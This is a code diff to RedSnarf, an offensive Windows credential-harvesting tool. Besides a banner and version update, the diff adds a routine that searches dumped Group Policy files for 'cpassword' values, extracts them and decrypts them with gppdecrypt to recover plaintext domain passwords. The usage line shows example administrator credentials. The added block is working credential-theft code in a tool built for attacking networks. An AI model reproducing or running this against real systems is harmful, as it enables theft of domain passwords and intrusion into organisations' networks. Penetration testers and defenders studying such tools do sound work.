@@ -53,6 +53,7 @@ def banner():
  |____|_  /\___  >____ /_______  /___|  (____  /__|   |__|    
         \/     \/     \/       \/     \/     \/                      
                                   redsnarf.ff0000@gmail.com
+                                                  @redsnarf
 """
 	print colored("\nE D Williams - NCCGroup",'red')
 	print colored("R Davy - NCCGroup\n",'red')
@@ -1118,7 +1119,7 @@ def main():
 					print colored ("[+]Found " + find_user + " logged in to "+str(ip),'green')
 
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="%prog 0.2e", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150))
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="%prog 0.2h", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150))
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
 p.add_argument("-u", "--username", dest="username", default="Administrator",help="Enter a username")
@@ -1868,6 +1869,40 @@ if policiesscripts_dump=='y' or policiesscripts_dump=='yes':
 					os.system("pwd")
 					os.system("grep --color='auto' -ri administrator")
 					os.system("grep --color='auto' -ri password")
+					
+					print colored("[+]Attempting to to find references for cpassword in "+outputpath+targets[0]+'/Policies/','green')
+					#Grep cpassword entries out to file
+					os.system("grep --exclude=cpassword.txt -ri \"cpassword\" > cpassword.txt")
+					#Check to see if cpassword file has been created
+					if os.path.isfile(outputpath+targets[0]+'/Policies/cpassword.txt'):
+						#If file is available parse it
+						print colored("[+]Excellent we have found cpassword in Policies... "+outputpath+targets[0]+'/Policies/','green')
+						print colored("[+]Items containing cpassword have been output to "+outputpath+targets[0]+'/Policies/cpassword.txt','blue')
+						try:
+							u = open(outputpath+targets[0]+'/Policies/cpassword.txt').read().splitlines()
+							
+							for n in u:
+								
+								#Try and filter for blank cpassword - cpassword=""
+								z=n.find("cpassword")
+								z=z+11
+								#If cpassword isn't blank continue
+								if n[z:]!="\"":
+									b=n.find("cpassword")
+								
+									if b>0:
+										b=b+11
+										c=n.find("\"",int(b))
+									
+									if b>0 and c>0:
+										d=n[int(b):int(c)]
+								
+									print colored("[+]Attemping to decrypt cpassword - "+d,'yellow')
+									gppdecrypt(d) 
+
+						except IOError as e:
+							print "I/O error({0}): {1}".format(e.errno, e.strerror) 
+
 				sys.exit()
 		else:
 			print colored ('[-]Something has gone wrong check your parameters!, Try --help for a list of parameters','red')
